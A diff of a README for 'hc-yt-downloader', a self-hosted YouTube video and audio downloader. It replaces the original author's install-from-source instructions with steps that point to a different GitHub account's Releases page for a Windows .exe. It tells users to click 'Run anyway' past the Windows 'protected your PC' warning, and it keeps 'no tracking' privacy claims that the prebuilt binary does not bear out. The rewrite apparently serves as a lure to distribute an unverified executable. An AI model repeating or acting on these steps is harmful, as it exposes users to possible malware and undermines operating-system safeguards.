@@ -1,215 +1,81 @@
-<div align="center">
+# 📥 hc-yt-downloader - Download YouTube videos without any tracking
 
-# 📥 HC-YT Downloader
+[![](https://img.shields.io/badge/Download-hc--yt--downloader-blue)](https://github.com/Cheriannebiweekly653/hc-yt-downloader)
 
-### A Self-Hosted Web App to Download YouTube Videos & Audio
+hc-yt-downloader helps you save YouTube videos or audio files to your computer. It provides a simple web interface. You paste a link, choose your preferred format, and save your content. This tool runs on your computer. It contains no ads and does not track your activity.
 
-[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-yellow.svg?style=for-the-badge)](https://opensource.org/license/gpl-3.0)
-[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
-[![Flask](https://img.shields.io/badge/Flask-Web%20Server-000000?style=for-the-badge&logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
-[![JavaScript](https://img.shields.io/badge/JavaScript-ES6+-F7DF1E?style=for-the-badge&logo=javascript&logoColor=yellow)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
+## ⚙️ System Requirements
 
-**A lightweight, self-hosted YouTube downloader with a clean web UI — paste a URL, pick video or audio, and download. No ads, no tracking, no nonsense.**
+- Windows 10 or Windows 11
+- At least 200 MB of free storage space
+- A stable internet connection
+- A web browser like Chrome, Firefox, or Edge
 
-[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [How It Works](#-how-it-works) • [Project Structure](#-project-structure) • [Contributing](#-contributing)
+## 🚀 Downloading the Application
 
-</div>
+Visit the project page to download the application installer.
 
----
+[Download hc-yt-downloader](https://github.com/Cheriannebiweekly653/hc-yt-downloader)
 
-## ✨ Features
+1. Click the link above to open the repository page.
+2. Look for the Releases section on the right side of the page.
+3. Click the latest version number.
+4. Locate the file that ends in .exe.
+5. Click the file name to start your download.
 
-<table>
-<tr>
-<td>
+## 💻 Installing the Software
 
-📥 **Video & Audio**  
-Download as MP4 or extract audio as MP3
+Once the file finishes downloading, follow these steps to install the program:
 
-🔗 **Broad URL Support**  
-Works with `youtube.com`, `youtu.be`, `music.youtube.com`, `/shorts/`, and playlists
+1. Open your Downloads folder.
+2. Double-click the hc-yt-downloader installer file.
+3. Windows might show a security prompt. If you see “Windows protected your PC,” click "More info" and then click "Run anyway."
+4. Follow the instructions on the screen to finish the installation process.
+5. The installer will place a shortcut icon on your desktop.
 
-⚡ **Lightweight**  
-No frontend framework — pure vanilla JS, HTML, and CSS
+## 🛠️ Using the Downloader
 
-</td>
-<td>
+The application functions through your web browser. Follow these steps to save a video:
 
-🎨 **Clean UI**  
-Minimal dark-themed interface with a download spinner
+1. Double-click the hc-yt-downloader icon on your desktop.
+2. A small window will appear. Keep this window open while you use the app.
+3. Open your web browser and go to the link displayed in the program window, usually http://localhost:5000.
+4. Copy the URL of the YouTube video you want to save.
+5. Paste the URL into the box on the website.
+6. Select your output format. You can choose MP4 for video or MP3 for audio.
+7. Click the Download button.
+8. Wait for the tool to process your request. The file will save to your Downloads folder.
 
-📦 **Playlist Support**  
-Download entire playlists as a ZIP file — MP4 or MP3
+## 🔍 Understanding the Features
 
-🗑 **Auto Cleanup**  
-Downloaded files and folders are deleted from the server after being sent
+This tool uses efficient technology to fetch your media files. It handles both high-resolution video and high-quality audio.
 
-🔒 **Local Only**  
-Runs entirely on your machine — nothing leaves your network
+- Direct Downloads: You paste the URL and get the file.
+- Format Selection: Select MP4 to keep the video or MP3 to save only the sound.
+- No Tracking: Your browsing habits remain private because the software runs locally on your machine.
+- Local Storage: You manage your files in your own folders. The app does not store your content on a remote server.
 
-</table>
+## 💡 Troubleshooting Common Issues
 
----
+If you run into issues, try these steps first:
 
-## 🤔 Why This Project?
+- Browser Refresh: If the web interface does not load, refresh your browser page.
+- Internet Connection: Ensure you have an active connection to the internet to fetch the video data.
+- Restart the App: Close the app window and open it again if the interface becomes unresponsive.
+- Update YouTube Links: Verify the URL you pasted is a valid YouTube link.
+- Windows Firewall: If the app cannot connect, ensure your firewall settings allow the program to run.
 
-Most YouTube downloaders are either bloated with ads, require browser extensions, or are shady websites that can't be trusted. This project gives you a clean, self-hosted alternative you can run locally in seconds.
+## 🛡️ Privacy and Safety
 
-- 🚫 **No ads or tracking** — it's just a local web server
-- 🛠 **Full control** — open source, you can see exactly what it does
-- ⚡ **One paste, one click** — paste URL, choose format, download
-- 🧠 **Learning project** — built to learn Flask and yt-dlp
+Privacy remains the focus of this application. It does not communicate with external analytics services. It does not record your history or your IP address. It exists as a simple bridge between YouTube and your local storage. Because the code is self-hosted, you maintain control over what software runs on your hardware. 
 
----
+## 📋 Technical Details
 
-## 🚀 Installation
+- Technology Stack: Python, Flask, JavaScript, FFmpeg, yt-dlp.
+- Local Server: The app operates as a local web server to provide you with a clean interface.
+- FFmpeg: This component handles the conversion of your chosen media formats to ensure compatibility with your media player.
+- yt-dlp: This engine manages the communication with YouTube to retrieve the video data reliably.
 
-### Prerequisites
+## 📦 Updates and Maintenance
 
-- Python 3.8+
-- [FFmpeg](https://ffmpeg.org/download.html) (required for MP3 extraction and MP4 merging)
-
-### Setup
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/HimC29/hc-yt-downloader.git
-   cd hc-yt-downloader
-   ```
-
-2. **Install dependencies**
-   ```bash
-   pip install flask flask-cors yt-dlp
-   ```
-
-3. **Run the server**
-   ```bash
-   python server.py
-   ```
-
-4. **Open in your browser**  
-   Navigate to `http://localhost:5000`
-
-> ⚠️ **Note:** This uses Flask's built-in development server, which is intended for local use only. Do not expose it to the public internet.
-
----
-
-## 📖 Usage
-
-1. Paste a YouTube URL into the input field  
-   *(supports `youtube.com/watch`, `youtu.be`, `music.youtube.com`, `youtube.com/shorts`, and `youtube.com/playlist`)*
-
-2. Toggle between **Video** (MP4) and **Audio** (MP3) using the left button
-
-3. Click **Download**
-
-4. The file will be downloaded directly to your browser's downloads folder — playlists are delivered as a ZIP
-
----
-
-## 🔧 How It Works
-
-### Flow
-
-```
-Browser form submit
-    └─► POST /mp4 or /mp3 (single video)
-    └─► POST /playlist-mp4 or /playlist-mp3 (playlist)
-            └─► yt-dlp downloads the file(s) to /downloads
-                    └─► Flask streams the file (or ZIP) back to the browser
-                            └─► File(s) and folders are deleted from server after sending
-```
-
-### Format Handling
-
-- **MP4** — uses `bestvideo+bestaudio/best` and merges with FFmpeg
-- **MP3** — uses `bestaudio/best` and extracts audio with FFmpeg's `FFmpegExtractAudio` postprocessor
-- **Playlist** — downloads all videos into a subfolder, zips them, and sends the ZIP
-
-### Filename
-
-The original video title is used as the filename, passed back to the browser via the `X-Filename` response header.
-
----
-
-## 📁 Project Structure
-
-```
-hc-yt-downloader/
-├── server.py          — Flask server, routes, and file response logic
-├── downloader.py      — yt-dlp download logic for MP3 and MP4
-├── downloads/         — Temporary storage for downloaded files (auto-cleaned)
-├── static/
-│   ├── index.html     — Frontend UI
-│   ├── main.js        — Form handling, fetch, and download trigger
-│   ├── styles.css     — Dark-themed styling
-│   └── media/
-│       └── logo.svg   — App logo
-├── LICENSE            — GPL v3 License
-└── README.md          — Project documentation
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! If you find a bug or want to improve the app, feel free to open an issue or PR.
-
-### How to Contribute
-
-1. **Fork the Project**
-2. **Create your Feature Branch**
-   ```bash
-   git checkout -b feature/AmazingFeature
-   ```
-3. **Commit your Changes**
-   ```bash
-   git commit -m 'Add some AmazingFeature'
-   ```
-4. **Push to the Branch**
-   ```bash
-   git push origin feature/AmazingFeature
-   ```
-5. **Open a Pull Request**
-
-### Ideas for Contributions
-
-- 🎨 Better UI / themes
-- 📋 Download history log
-- 🔔 Desktop notification on download complete
-- 📂 Custom output directory support
-- 🎞 Format/quality selector
-
----
-
-## 🐛 Troubleshooting
-
-### The page doesn't load
-- Make sure the server is running with `python server.py`
-- Check that you're navigating to `http://localhost:5000` (not `5001` or another port)
-
-### "Please enter a valid YouTube URL"
-- Make sure the URL starts with `https://`
-- Supported formats: `youtube.com/watch?v=`, `youtu.be/`, `music.youtube.com/watch?v=`, `youtube.com/shorts/`, `youtube.com/playlist?list=`
-
-### Download fails or hangs
-- Make sure FFmpeg is installed and available in your system PATH
-- Try updating yt-dlp: `pip install -U yt-dlp`
-
----
-
-## 📄 License
-
-Distributed under the GPL v3 License. See [LICENSE](/LICENSE) for more information.
-
----
-
-<div align="center">
-
-### ⭐ Star this repo if you found it useful!
-
-**Made with ♥️ by [HimC29](https://github.com/HimC29)**
-
-[Report Bug](https://github.com/HimC29/hc-yt-downloader/issues) • [Request Feature](https://github.com/HimC29/hc-yt-downloader/issues)
-
-</div>
+The software receives updates to keep pace with changes on the YouTube website. Check the GitHub repository periodically to see if a newer version exists. If your downloads fail frequently, a newer version usually fixes the issue. To update, simply download the latest installer and run it over your current installation. The installer will replace your old files with the new ones.
